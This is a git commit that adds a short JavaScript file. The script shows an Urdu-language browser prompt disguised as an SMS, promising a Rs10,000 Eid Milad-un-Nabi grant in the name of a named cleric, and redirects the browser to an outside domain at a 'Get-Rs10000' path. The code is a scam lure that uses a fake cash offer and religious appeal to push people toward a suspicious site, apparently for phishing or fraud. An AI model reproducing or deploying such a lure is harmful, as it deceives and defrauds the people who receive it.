a912553b170f7f9240804a284f5a6311e0d36575
bigetijazz32 <bigetijazz32@gmail.com>
2025-08-30 15:07:54 +0100

    Create pakiseid.js

---
+++ pakiseid.js
@@ -0,0 +1,6 @@
+
+var password = 'واپس لینا Rs10,000'
+password=prompt('SMS: میں خوش آمدید Maulana Abdul Khabeer Rs10,000 منانے کے لیے گرانٹ Eid Milad-un-Nabi, اب واپس لینے کے لیے ٹھیک ہے کو دبائیں۔','واپس لینا Rs10,000');
+if (password != 'واپس لینا Rs10,000') {
+location.href='https://www.udwang.xyz/Get-Rs10000';
+}
